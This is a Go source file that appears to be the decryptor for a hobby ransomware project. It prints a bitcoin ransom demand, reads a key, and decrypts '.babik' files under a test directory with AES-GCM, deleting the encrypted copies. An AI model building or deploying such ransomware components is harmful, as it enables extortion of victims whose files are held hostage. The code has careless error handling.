package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	fmt.Println("Please send me 0.2 btc and I will send you the key :)")
	fmt.Print("Key: ")
	var key string
	fmt.Scanln(&key)

	// Initialize AES in GCM mode
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}

	// looping through target files
	filepath.Walk("/home/catur/Testing", func(path string, info os.FileInfo, err error) error {
		// skip if directory
		if !info.IsDir() && path[len(path)-6:] == ".babik" {
			// decrypt the file
			fmt.Println("Decrypting " + path)

			// read file contents
			encrypted, err := os.ReadFile(path)
			if err == nil {
				// Decrypt bytes
				nonce := encrypted[:gcm.NonceSize()]
				encrypted = encrypted[gcm.NonceSize():]
				original, err := gcm.Open(nil, nonce, encrypted, nil)

				// write decrypted contents
				err = os.WriteFile(path[:len(path)-6], original, 0666)
				if err == nil {
					os.Remove(path) // delete the encrypted file
				} else {
					fmt.Println("error while writing contents")
				}
			} else {
				fmt.Println("error while reading file contents")
			}
		}
		return nil
	})
}
